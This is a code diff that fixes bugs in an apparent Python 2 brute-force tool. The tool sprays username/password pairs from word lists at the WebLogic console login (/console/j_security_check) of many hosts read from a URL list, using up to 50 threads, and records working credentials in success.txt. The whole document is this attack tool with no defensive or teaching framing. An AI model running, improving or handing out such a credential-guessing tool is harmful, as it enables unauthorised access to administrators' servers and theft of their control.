@@ -1,8 +1,7 @@
 import requests
 import time
 import threading
-import sys
-import os
+import traceback
 
 RETRY=3
 MAX_THREAD=50
@@ -20,18 +19,22 @@ class Brute:
 			try:
 				s = requests.post('http://%s/console/j_security_check'%url, data=data, timeout=5)
 				if s.content.count('Home Page') != 0 or s.content.count('WebLogic Server Console') != 0 or s.content.count('console.portal') != 0:
-					print 'Success!!!!! %s\t%s/%s                                                                                    ' % (i, usr, pwd)
+					print 'Success!!!!! %s %s/%s                                                                                    ' % (url, usr, pwd)
 					self.success += 1
 					f = open('success.txt', 'a')
-					f.write('%s %s/%s' % (i, usr, pwd))
+					f.write('%s %s/%s' % (url, usr, pwd))
 					f.close()
 					return True
 				else:
 					return False
 			except:
+				# traceback.print_exc()
 				count+=1
 				time.sleep(1)
 		self.error+=1
+		f=open('error.txt','a')
+		f.write('%s\n'%url)
+		f.close()
 
 	def _main(self):
 		for usr in open('usr.txt').readlines():
@@ -48,7 +51,8 @@ class Brute:
 						time.sleep(1)
 				with open('url_list') as f:
 					for url in f:
-						t = threading.Thread(target=_do_login, args=(url,))
+						url=url.strip()
+						t = threading.Thread(target=self._do_login, args=(url,usr,pwd))
 						t.daemon = True
 						while True:
 							if threading.active_count() < MAX_THREAD:
@@ -58,5 +62,6 @@ class Brute:
 							else:
 								time.sleep(1)
 
-run=Brute()
-run._main()
+if __name__ == '__main__':
+	run=Brute()
+	run._main()
